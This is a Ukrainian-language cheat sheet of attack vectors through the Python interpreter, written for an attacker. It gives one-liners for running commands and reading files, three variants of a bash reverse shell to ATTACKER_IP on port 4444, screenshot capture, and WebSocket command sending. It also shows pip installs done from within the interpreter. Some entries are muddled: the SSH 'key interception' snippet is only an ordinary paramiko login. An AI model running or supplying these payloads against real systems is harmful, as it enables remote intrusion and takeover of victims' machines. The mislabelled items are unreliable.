
# Вектори атак через Python-інтерпретатор

Цей документ містить список основних векторів атак за допомогою Python-інтерпретатора, з прикладами для віддаленого виконання команд, відкриття з’єднання з атакуючою машиною, а також інших методів експлуатації.

## Вектори атак

1. **Виконання команди через `os.popen`**
   - Використовується для виконання команд на системі і повернення результату.
   - **Приклад**: Виведення поточного користувача (whoami) через `os.popen`:
     ```python
     __import__('os').popen('whoami').read()
     ```

2. **Читання вмісту файлу**
   - Для читання вмісту файлу одним рядком, аналогічно тому, як `__import__('os').popen('whoami').read()`, можна застосувати команду в Unix/Linux для читання файлу через Python в такому форматі:
   - **Приклад**: Використання умовно `cat` для віддаленого виконання:
     ```python
     __import__('os').popen('cat /path/to/your/file.txt').read()

     ```

3. **Виконання зворотного Shell через Python**
   - Відкриває зворотне з'єднання через Bash з атакуючою машиною на порту 4444.
   - **Приклад**: Відкриття зворотного з'єднання:
     ```python
     __import__('os').popen("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'").read()
     ```

4. **Виконання команди через `subprocess`**
   - Можна використовувати `subprocess` для виконання команд в системі, що дозволяє більш складно інтегрувати команди, наприклад, через аргументи.
   - **Приклад**: Виконання команди на цільовій системі:
     ```python
     import subprocess
     subprocess.Popen(["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"])
     ```

5. **Використання `os.system` для зворотного Shell**
   - `os.system` дозволяє виконувати команди в shell.
   - **Приклад**: Встановлення зворотного з'єднання за допомогою `os.system`:
     ```python
     import os
     os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
     ```

6. **Використання Python для перехоплення SSH ключів**
   - Можна створити просту сесію для підключення до SSH-серверу через Python, що дасть змогу зловити ключі.
   - **Приклад**: Використання Python для підключення до SSH через `paramiko`:
     ```python
     import paramiko
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect('TARGET_IP', username='user', password='password')
     ```

7. **Захоплення екрану через Python**
   - Використання бібліотеки `pyautogui` для захоплення скріншоту цільової машини.
   - **Приклад**: Зробити скріншот:
     ```python
     import pyautogui
     pyautogui.screenshot('screenshot.png')
     ```

8. **Виконання віддаленого коду через WebSocket**
   - Можна використовувати WebSocket для виконання віддаленого коду на цільовій машині.
   - **Приклад**: Використання WebSocket для віддаленого виконання команд:
     ```python
     import websocket
     ws = websocket.create_connection("ws://TARGET_IP:PORT")
     ws.send("command_to_execute")
     ```

## Інсталяція Python-модулів безпосередньо з Python-інтерпретатора

Іноді під час експлуатації або тестування зловмисник може захотіти встановити додаткові модулі безпосередньо через Python-інтерпретатор, не виходячи з нього. Ось як можна зробити інсталяцію:

1. **Інсталяція за допомогою `subprocess`**:
   - Використовує команду `pip` для встановлення пакета:
   ```python
   import subprocess
   import sys
   subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
   ```

2. **Інсталяція через `pip` бібліотеку**:
   - Можна використовувати метод `pip.main()`, якщо ви працюєте зі старішими версіями Python:
   ```python
   import pip
   pip.main(['install', 'pyautogui'])
   ```

3. **Альтернативний метод**: 
   - За допомогою **`subprocess`** можна також використовувати інші методи для більш контрольованого виконання.
   ```python
   import subprocess
   subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
   ```

